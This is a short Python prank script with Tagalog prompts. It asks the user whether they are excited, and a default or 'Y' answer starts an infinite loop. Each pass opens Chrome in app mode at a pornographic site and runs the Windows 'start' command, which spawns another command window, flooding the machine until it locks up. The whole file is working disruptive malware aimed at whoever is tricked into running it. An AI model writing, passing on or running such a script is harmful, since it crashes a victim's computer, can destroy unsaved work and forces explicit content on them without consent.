import os

# Disclaimer: Anumang paggalaw ng file na ito ay maaaring makasira ng computer mo, kaya ingat lang.

def goodbye():
    while True:
        os.system("\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --chrome-frame --app=https://pornhub.com")
        os.system("start")


if __name__ == '__main__':
    x = input("Excited ka na ba? [Y/n] ")
    if x == '':
        goodbye()
    elif x == 'Y':
        goodbye()
    elif x == 'y':
        goodbye()
    elif x == 'n':
        print("Dapat pinindot mo yung Y")
        exit(0)
    elif x == 'N':
        print("Dapat pinindot mo yung Y")
        exit(0)
